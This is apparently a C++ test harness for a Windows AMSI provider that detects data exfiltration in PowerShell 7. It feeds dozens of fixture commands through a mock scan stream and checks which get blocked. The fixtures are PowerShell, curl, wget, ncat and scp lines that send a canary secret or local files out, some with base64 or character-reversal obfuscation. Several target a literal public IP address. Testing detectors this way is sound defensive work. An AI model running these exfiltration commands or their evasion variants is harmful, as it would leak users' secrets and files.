#define NOMINMAX
#include <windows.h>
#include <amsi.h>
#include <wrl/client.h>
#include <algorithm>
#include <cstring>
#include <iomanip>
#include <iostream>
#include <string>
#include <string_view>

namespace {
constexpr wchar_t PS7[] = L"PowerShell_C:\\Program Files\\PowerShell\\7\\pwsh.exe_7.6.9";
constexpr wchar_t Hit[] = L"Invoke-WebRequest -Method Post -Uri 'https://example.invalid/upload' -Body 'PS7GUARD_TEST_SECRET'";
constexpr wchar_t Clean[] = L"Invoke-WebRequest -Method Post -Uri 'https://example.invalid/upload' -Body 'hello'";
enum class Source { Buffer, Stream, Stalled, Error, Odd, NoSize };
enum class AppAttribute { Normal, ReadError, TooLarge, WrongLength, NoTerminator };

class Fixture final : public IAmsiStream {
public:
    Fixture(std::wstring_view text, std::wstring_view app, Source kind, AppAttribute attr, bool metadata)
        : text(text), app(app), kind(kind), appAttr(attr), metadata(metadata) {}
    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID iid, void** out) override {
        if (!out) return E_POINTER;
        *out = nullptr;
        if (iid != __uuidof(IAmsiStream) && iid != __uuidof(IUnknown)) return E_NOINTERFACE;
        *out = static_cast<IAmsiStream*>(this);
        AddRef();
        return S_OK;
    }
    ULONG STDMETHODCALLTYPE AddRef() override { return ++refs; }
    ULONG STDMETHODCALLTYPE Release() override { return --refs; }

    HRESULT STDMETHODCALLTYPE GetAttribute(AMSI_ATTRIBUTE attr, ULONG cap, PBYTE buf, ULONG* actual) override {
        ULONGLONG size = text.size() * sizeof(wchar_t);
        const auto address = text.data();
        switch (attr) {
        case AMSI_ATTRIBUTE_APP_NAME:
            ++appCalls;
            if (appAttr == AppAttribute::TooLarge && !cap) {
                *actual = 128 * 1024 + sizeof(wchar_t);
                return E_NOT_SUFFICIENT_BUFFER;
            }
            if (appAttr == AppAttribute::ReadError && cap) return E_FAIL;
            if (appAttr == AppAttribute::WrongLength && cap) {
                *actual = cap + sizeof(wchar_t);
                return S_OK;
            }
            if (appAttr == AppAttribute::NoTerminator && cap) {
                std::memset(buf, 0x41, cap);
                *actual = cap;
                return S_OK;
            }
            return Copy(app.data(), (app.size() + 1) * sizeof(wchar_t), cap, buf, actual);
        case AMSI_ATTRIBUTE_CONTENT_SIZE:
            if (kind == Source::NoSize) return E_NOTIMPL;
            if (kind == Source::Odd) --size;
            return Copy(&size, sizeof(size), cap, buf, actual);
        case AMSI_ATTRIBUTE_CONTENT_ADDRESS:
            if (kind == Source::Buffer)
                return Copy(&address, sizeof(address), cap, buf, actual);
            return E_NOTIMPL;
        case AMSI_ATTRIBUTE_CONTENT_NAME: {
            constexpr wchar_t source[] = L"C:\\fixture.ps1";
            return metadata ? Copy(source, sizeof(source), cap, buf, actual) : E_NOTIMPL;
        }
        case AMSI_ATTRIBUTE_SESSION: {
            constexpr ULONG_PTR opaque = 0x12345678;
            return metadata ? Copy(&opaque, sizeof(opaque), cap, buf, actual) : E_NOTIMPL;
        }
        default: return E_NOTIMPL;
        }
    }

    HRESULT STDMETHODCALLTYPE Read(ULONGLONG pos, ULONG cap, PBYTE buf, ULONG* count) override {
        ++reads;
        *count = 0;
        if (kind == Source::Error) return E_FAIL;
        if (kind == Source::Stalled) return S_OK;
        const auto size = text.size() * sizeof(wchar_t);
        if (pos >= size) return S_OK;
        *count = static_cast<ULONG>(std::min({ULONGLONG{7}, ULONGLONG{cap}, size - pos}));
        std::memcpy(buf, reinterpret_cast<const BYTE*>(text.data()) + pos, *count);
        return S_OK;
    }
    unsigned reads = 0;
    unsigned appCalls = 0;
private:
    static HRESULT Copy(const void* src, size_t size, ULONG cap, PBYTE buf, ULONG* actual) {
        *actual = static_cast<ULONG>(size);
        if (cap < size) return E_NOT_SUFFICIENT_BUFFER;
        std::memcpy(buf, src, size);
        return S_OK;
    }
    std::wstring_view text, app;
    Source kind;
    AppAttribute appAttr;
    bool metadata;
    ULONG refs = 1;
};
}

int wmain(int argc, wchar_t** argv) {
    if (argc < 3 || argc > 4) return 2;
    const std::wstring_view mode = argv[2];
    if (mode != L"baseline" && mode != L"guard" && mode != L"managed" && mode != L"managed-external") return 2;
    const bool guard = mode != L"baseline";
    const bool captureMode = mode == L"managed" || mode == L"managed-external";
    const auto dll = LoadLibraryExW(argv[1], nullptr,
        LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR | LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
    if (!dll) { std::cerr << "LoadLibraryExW error=" << GetLastError() << '\n'; return 2; }
    const auto init = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(init) && init != RPC_E_CHANGED_MODE) return 2;
    CLSID clsid{};
    if (FAILED(CLSIDFromString(guard ? L"{B19A3622-9E37-46C6-9A76-D48332292DC7}"
                                     : L"{2E5D8A62-77F9-4F7B-A90C-2744820139B2}", &clsid))) return 2;
    using Entry = HRESULT (WINAPI*)(REFCLSID, REFIID, LPVOID*);
    const auto proc = GetProcAddress(dll, "DllGetClassObject");
    Entry getClass = nullptr;
    static_assert(sizeof(getClass) == sizeof(proc));
    std::memcpy(&getClass, &proc, sizeof(proc));
    Microsoft::WRL::ComPtr<IClassFactory> factory;
    Microsoft::WRL::ComPtr<IAntimalwareProvider> provider;
    if (!getClass || FAILED(getClass(clsid, IID_PPV_ARGS(&factory))) ||
        FAILED(factory->CreateInstance(nullptr, IID_PPV_ARGS(&provider)))) {
        std::cerr << "COM activation failed\n";
        return 2;
    }
    const auto neutral = AMSI_RESULT_NOT_DETECTED;
    const auto block = captureMode ? AMSI_RESULT_BLOCKED_BY_ADMIN_START : neutral;
    bool pass = true;
    auto check = [&](const char* label, std::wstring_view text, AMSI_RESULT expected,
                     Source source = Source::Buffer, std::wstring_view app = PS7, bool expectRead = false,
                     AppAttribute appAttr = AppAttribute::Normal, unsigned expectedAppCalls = 2) {
        Fixture stream(text, app, source, appAttr, captureMode);
        AMSI_RESULT result = AMSI_RESULT_CLEAN;
        const auto hr = provider->Scan(&stream, &result);
        const bool ok = hr == S_OK && result == expected && (stream.reads > 0) == expectRead &&
                        stream.appCalls == expectedAppCalls;
        std::cout << label << " hr=0x" << std::hex << hr << " result=0x" << result
                  << std::dec << " reads=" << stream.reads << " app-calls=" << stream.appCalls
                  << ' ' << (ok ? "PASS" : "FAIL") << '\n';
        pass &= ok;
    };
    if (captureMode) {
        if (mode == L"managed-external") {
            const std::wstring external = L"Invoke-WebRequest -Method Post -Uri 'http://124.223.64.165:8080/' -Body 'PS7GUARD_TEST_SECRET'";
            check("reported-external-command", external, block);
            check("loopback-not-trusted-by-default",
                L"Invoke-WebRequest -Method Post -Uri 'http://127.0.0.1:8080/' -Body 'PS7GUARD_TEST_SECRET'", block);
            std::wstring maximum = external + L"\r\n#";
            maximum.resize(32768, L'\u6D4B');
            check("64KiB-script-stream", maximum, block, Source::Stream, PS7, true);
            maximum += L'x';
            check("over-64KiB-not-read", maximum, neutral, Source::Stream);
            std::wstring wideChain;
            for (int i = 0; i < 220; ++i)
                wideChain += L"$case" + std::to_wstring(i) + L" = 'ordinary'; ";
            wideChain += L"$payload = 'PS7GUARD_' + 'TEST_SECRET'; "
                         L"Invoke-WebRequest -Method Post -Uri 'http://124.223.64.165:8080/' -Body $payload -TimeoutSec 5";
            check("220-assignments-and-concatenation", wideChain, block);
            check("base64-body",
                L"Invoke-WebRequest -Method Post -Uri 'http://124.223.64.165:8080/' -Body 'UFM3R1VBUkRfVEVTVF9TRUNSRVQ='", block);
            check("base64-native-stdin",
                L"Write-Output 'UFM3R1VBUkRfVEVTVF9TRUNSRVQ=' | curl.exe --data-binary '@-' 'http://124.223.64.165:8080/'", block);
            const std::wstring reorder = L"$guardOrigin = 'PS7GUARD_TEST_SECRET'; $guardChars = $guardOrigin.ToCharArray(); "
                L"[array]::Reverse($guardChars); $guardBody = -join $guardChars; "
                L"curl.exe -sS -H 'Content-Type: text/plain' --data-binary $guardBody 'https://guard-fixture.invalid/submit'";
            check("tracked-character-mutation", reorder, block);
            auto clean = reorder;
            const std::wstring_view marker = L"PS7GUARD_TEST_SECRET";
            clean.replace(clean.find(marker), marker.size(), L"ordinary-data");
            check("clean-character-mutation", clean, neutral);
            check("p0-preceding-command", L"Write-Host test; Invoke-RestMethod -Uri https://regression.invalid/ -Method Post -Body 'PS7GUARD_TEST_SECRET'", block);
            check("p0-http-headers", L"Invoke-RestMethod -Uri https://regression.invalid/ -Method Post -Headers @{'X-Test'='1'} -Body 'PS7GUARD_TEST_SECRET'", block);
            check("p0-curl-option", L"curl -k -d 'PS7GUARD_TEST_SECRET' https://regression.invalid/", block);
            check("p0-url-query", L"wget.exe 'https://regression.invalid/?q=PS7GUARD_TEST_SECRET'", block);
            check("p1-positional-splat", L"$peerUri = @('https://regression.invalid/'); Invoke-RestMethod @peerUri -Method Post -Body 'PS7GUARD_TEST_SECRET'", block);
            check("p1-json-content", LR"(Invoke-RestMethod -Uri https://regression.invalid/ -Method Post -Body '{"payload":"UFM3R1VBUkRfVEVTVF9TRUNSRVQ="}')", block);
            check("reg8-alias-and-pipe", L"'PS7GUARD_TEST_SECRET' | irm -Uri https://regression.invalid/ -Method Post", block);
            check("reg8-url-path", L"curl.exe --http1.1 'https://regression.invalid/PS7GUARD_TEST_SECRET'", block);
            check("followup-possible-branch", L"if ($guardFixtureCondition) { Invoke-RestMethod -Uri https://regression.invalid/ -Method Post -Body 'PS7GUARD_TEST_SECRET' }", block);
            check("followup-external-using", LR"(using assembly 'Q:\unavailable-guard-fixture.dll'; Invoke-RestMethod -Uri https://regression.invalid/ -Method Post -Body 'PS7GUARD_TEST_SECRET')", block);
            check("shared-curl-multi-destination", L"curl.exe -d 'PS7GUARD_TEST_SECRET' https://a.regression.invalid/ https://b.regression.invalid/", block);
            Sleep(350); // Drain the bounded asynchronous journal between fixture batches.
            check("abbreviated-out-variable-branch", L"$flag=0; Write-Output 1 -OutV flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body 'PS7GUARD_TEST_SECRET' }", block);
            check("comparison-preincrement-branch", L"$i=0; if ((++$i) -eq 1) { if ($i) { irm -Uri https://regression.invalid/ -Body 'PS7GUARD_TEST_SECRET' } }", block);
            check("out-variable-branch", L"$flag=0; Write-Output 1 -OutVariable flag | Out-Null; if ($flag) { irm -Uri https://regression.invalid/ -Body 'PS7GUARD_TEST_SECRET' }", block);
            check("preincrement-branch", L"$counter=0; if (++$counter) { if ($counter) { irm -Uri https://regression.invalid/ -Body 'PS7GUARD_TEST_SECRET' } }", block);
            check("wget-http-credentials", L"wget.exe --http-user user --http-password PS7GUARD_TEST_SECRET https://regression.invalid/", block);
            check("curl-proxy-credentials", L"curl.exe -x http://proxy.regression.invalid:8080 -U 'user:PS7GUARD_TEST_SECRET' https://regression.invalid/", block);
            check("numeric-zero-else", L"$flag=0; if ($flag) { 'ordinary' } else { irm -Uri https://regression.invalid/ -Body 'PS7GUARD_TEST_SECRET' }", block);
            check("curl-credential-flow", L"curl.exe -u 'user:PS7GUARD_TEST_SECRET' https://regression.invalid/", block);
            check("nested-subexpression-send", L"$result=$(irm -Uri https://regression.invalid/ -Method Post -Body 'PS7GUARD_TEST_SECRET')", block);
            check("continue-after-block", L"irm -Uri https://first.regression.invalid/ -Method Post -Body 'PS7GUARD_TEST_SECRET'; "
                L"iwr -Uri https://second.regression.invalid/ -Method Post -Body 'PS7GUARD_TEST_SECRET'", block);
            check("known-false-branch", L"$guardBranch = $false; if ($guardBranch) { irm -Uri https://regression.invalid/ -Method Post -Body 'PS7GUARD_TEST_SECRET' }", neutral);
            check("reg8-namespace-and-if", L"using namespace System\nif ($true) { Invoke-WebRequest 'https://regression.invalid/PS7GUARD_TEST_SECRET' }", block);
            check("p0-ncat-stdin", L"Write-Output 'PS7GUARD_TEST_SECRET' | ncat.exe regression.invalid 8080", block);
            check("curl-adapter-upload", L"curl.exe -fsS --max-time 5 -H 'X-Guard: PS7GUARD_TEST_SECRET' "
                L"'https://guard-fixture.invalid/adapter'", block);
            check("wget-adapter-upload", L"wget.exe -q --timeout=5 --post-data 'PS7GUARD_TEST_SECRET' "
                L"'https://guard-fixture.invalid/adapter'", block);
            check("wget-adapter-download", L"wget.exe -q -O 'PS7GUARD_TEST_SECRET.txt' "
                L"'https://guard-fixture.invalid/adapter'", neutral);
            if (argc == 4 && argv[3] && argv[3][0]) {
                std::wstring path;
                for (const auto c : std::wstring_view(argv[3])) { path += c; if (c == L'\'') path += c; }
                check("scp-adapter-upload", L"scp.exe -qpC -P 2222 '" + path +
                    L"' 'guard-fixture.invalid:/incoming/'", block);
                check("scp-adapter-download", L"scp.exe -qpC -P 2222 'guard-fixture.invalid:/remote.zip' '" + path + L"'", neutral);
                check("independent-pipeline-restart", L"'ordinary' | Write-Output | Sort-Object | Get-Content -LiteralPath '" +
                    path + L".txt' -Raw -Encoding utf8 | Write-Output | irm -Uri https://regression.invalid/ -Method Post", block);
                check("captured-file-out-variable", L"Get-Content -Raw -OutV captured -LiteralPath '" + path + L".txt' | Out-Null; "
                    L"irm -Uri https://regression.invalid/ -Method Post -Body $captured[0]", block);
                Sleep(350); // Let the asynchronous journal consume the preceding fixture batch.
                check("form-file-object", L"$form=@{ file = Get-Item -LiteralPath '" + path + L".txt' }; "
                    L"irm -Uri https://regression.invalid/upload -Method Post -Form $form", block);
                check("convertto-json-provenance", L"$text=Get-Content -Raw -LiteralPath '" + path + L".txt'; "
                    L"$json=@{ data = $text } | ConvertTo-Json -Compress; "
                    L"irm -Uri https://regression.invalid/upload -Method Post -ContentType application/json -Body $json", block);
                check("streamed-large-file",
                    L"Invoke-RestMethod -Method Post -Uri 'https://regression.invalid/' -InFile '" + path + L".large.txt'", block);
                check("ncat-listener-stdin",
                    L"Get-Content -LiteralPath '" + path + L".txt' -Raw | ncat.exe -l 9000", block);
                check("nested-json-lines",
                    L"$s=Get-Content -LiteralPath '" + path + L".txt'; $body=@{ token=$s } | ConvertTo-Json -Compress; "
                    L"irm -Uri https://regression.invalid/ -Method Post -Body $body", block);
                check("form-childitem-default",
                    L"$form=@{ files=Get-ChildItem -LiteralPath '" + path + L".files' }; "
                    L"irm -Uri https://regression.invalid/ -Method Post -Form $form", block);
                check("large-file-tail",
                    L"Get-Content -LiteralPath '" + path + L".tail.txt' -Tail 1 | ncat.exe -l 9000", block);
                Sleep(350); // Give the bounded async queue room for the final fixture batch.
                check("streamed-head-records",
                    L"Get-Content -LiteralPath '" + path + L".large.txt' -TotalCount 1 | ncat.exe -l 9000", block);
                check("filtered-childitem-form",
                    L"$form=@{files=Get-ChildItem -LiteralPath '" + path + L".files' -File -Filter '*.txt'}; "
                    L"irm -Uri https://regression.invalid/ -Method Post -Form $form", block);
                check("streamed-raw-json",
                    L"$s=Get-Content -LiteralPath '" + path + L".large.txt' -Raw; "
                    L"$largeBody=@{content=$s}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $largeBody", block);
                check("multipart-exclude-candidates",
                    L"$form=@{files=Get-ChildItem '" + path + L".files' -File -Exclude '*.tmp'}; "
                    L"irm -Uri https://regression.invalid/ -Method Post -Form $form", block);
                check("streamed-line-record-json",
                    L"$lines=Get-Content -LiteralPath '" + path + L".large.txt'; "
                    L"$records=@{lines=$lines}|ConvertTo-Json -Compress; irm -Uri https://regression.invalid/ -Body $records", block);
                check("archive-file",
                    L"Invoke-WebRequest -Method Post -Uri 'http://124.223.64.165:8080/' -InFile '" + path + L"'", block);
            }
        } else {
            check("rich-script", LR"($secret = Get-Content -LiteralPath 'C:\fixture.txt'
Invoke-RestMethod -Uri 'https://example.invalid/upload' -Body $secret
Get-Content -Path 'C:\fixture.txt' | ncat.exe 127.0.0.1 8080
Invoke-Expression 'Get-Process'
[Convert]::FromBase64String('aGk='))", neutral);
            check("missing-body", L"Invoke-RestMethod -Method Post -Uri 'https://example.invalid/upload' -Body $secret", neutral);
            check("ast-blocks-double-quoted-literal",
                  LR"(Invoke-WebRequest -Method Post -Uri "https://example.invalid/upload" -Body "PS7GUARD_TEST_SECRET")", block);
        }
        Sleep(500); // Give the asynchronous writer time before the harness inspects the file.
        provider.Reset();
        factory.Reset();
        FreeLibrary(dll);
        if (SUCCEEDED(init)) CoUninitialize();
        return pass ? 0 : 1;
    }
    check("canary-body/buffer", Hit, block);
    check("canary-body/short-reads", Hit, block, Source::Stream, PS7, true);
    check("ordinary-body", Clean, neutral);
    check("ordinary-command", L"Write-Output 'PS7GUARD_TEST_SECRET'", neutral);
    if (guard) {
        const auto longApp = std::wstring(L"PowerShell_C:\\") + std::wstring(2000, L'a') + L"\\pwsh.exe_7.6.9";
        check("long-app-name", Hit, block, Source::Stream, longApp, true);
        check("app-name-read-error", Hit, neutral, Source::Stream, PS7, false, AppAttribute::ReadError);
        check("app-name-oversize", Hit, neutral, Source::Stream, PS7, false, AppAttribute::TooLarge, 1);
        check("app-name-wrong-length", Hit, neutral, Source::Stream, PS7, false, AppAttribute::WrongLength);
        check("app-name-no-terminator", Hit, neutral, Source::Stream, PS7, false, AppAttribute::NoTerminator);
        check("reordered-put", L"\r\ninvoke-restmethod -body 'PS7GUARD_TEST_SECRET' -uri 'https://example.invalid/x' -method 'PUT' \r\n", block);
        check("other-host", Hit, neutral, Source::Stream, L"PowerShell_powershell.exe_5.1");
        check("marker-in-uri-only", L"Invoke-WebRequest -Method POST -Uri 'https://example.invalid/PS7GUARD_TEST_SECRET' -Body 'hello'", neutral);
        check("get-not-covered", L"Invoke-WebRequest -Method GET -Uri 'https://example.invalid' -Body 'PS7GUARD_TEST_SECRET'", neutral);
        check("interpolated-body", L"Invoke-WebRequest -Method POST -Uri 'https://example.invalid' -Body \"$PS7GUARD_TEST_SECRET\"", neutral);
        check("literal-escape-not-covered", L"Invoke-WebRequest -Method POST -Uri 'https://example.invalid' -Body 'PS7GUARD_TEST_SECRET''more'", neutral);
        check("extra-statement", std::wstring(Hit) + L"; Write-Output 'done'", neutral);
        check("read-error", Hit, neutral, Source::Error, PS7, true);
        check("zero-progress", Hit, neutral, Source::Stalled, PS7, true);
        check("odd-byte-length", Hit, neutral, Source::Odd);
        check("missing-length", Hit, neutral, Source::NoSize);
        check("size-limit", std::wstring(32769, L' '), neutral, Source::Stream);
        LPWSTR displayName = nullptr;
        const bool nameOk = provider->DisplayName(&displayName) == S_OK && displayName &&
                            std::wstring_view(displayName) == L"PowerShell7Guard";
        CoTaskMemFree(displayName);
        std::cout << "display-name " << (nameOk ? "PASS" : "FAIL") << '\n';
        pass &= nameOk;
    }
    provider.Reset();
    factory.Reset();
    FreeLibrary(dll);
    if (SUCCEEDED(init)) CoUninitialize();
    return pass ? 0 : 1;
}

#ifdef GUARD_FIXTURE_DLL
extern "C" __declspec(dllexport) int WINAPI RunGuardFixture(const wchar_t* provider) {
    wchar_t executable[] = L"GuardFixture";
    wchar_t mode[] = L"managed";
    wchar_t* args[] = { executable, const_cast<wchar_t*>(provider), mode };
    return wmain(3, args);
}
extern "C" __declspec(dllexport) int WINAPI RunGuardNetworkDiagnosis(const wchar_t* provider, const wchar_t* archive) {
    wchar_t executable[] = L"GuardFixture";
    wchar_t mode[] = L"managed-external";
    wchar_t* args[] = { executable, const_cast<wchar_t*>(provider), mode, const_cast<wchar_t*>(archive) };
    return wmain(4, args);
}
#endif
